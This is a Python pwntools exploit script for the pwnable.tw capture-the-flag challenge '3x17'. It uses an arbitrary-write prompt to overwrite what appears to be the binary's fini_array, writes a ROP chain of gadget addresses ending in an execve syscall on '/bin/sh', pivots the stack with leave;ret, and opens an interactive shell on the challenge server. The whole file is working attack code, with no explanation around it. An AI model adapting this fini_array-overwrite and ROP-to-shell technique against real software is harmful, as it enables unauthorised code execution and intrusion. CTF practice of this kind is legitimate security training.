#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./3x17"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("chall.pwnable.tw",10105)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

r.sendafter("addr:",str(0x4B40F0))
r.sendafter("data:",p64(0x402960)+p64(0x0401B6D))

rop_addr = 0x4B4100
rop = [
    0x401696, # pop rdi
    rop_addr+9*8,# /bin/sh
    0x446e35,# pop rdx
    0,
    0x406c30,# pop rsi
    0,
    0x41e4af,# pop rax
    0x3b,
    0x446ECF,# syscall
]

r.sendafter("addr:",str(rop_addr))
r.sendafter("data:",p64(rop[0])+p64(rop[1])+p64(rop[2]))
r.sendafter("addr:",str(rop_addr+0x18))
r.sendafter("data:",p64(rop[3])+p64(rop[4])+p64(rop[5]))
r.sendafter("addr:",str(rop_addr+0x30))
r.sendafter("data:",p64(rop[6])+p64(rop[7])+p64(rop[8]))
r.sendafter("addr:",str(rop_addr+0x48))
r.sendafter("data:","/bin/sh\x00")

r.sendafter("addr:",str(0x4B40F0))
leave_ret = 0x0401C4B

r.sendafter("data:",p64(0x0401C4B)+p64(0x401697))
r.interactive()













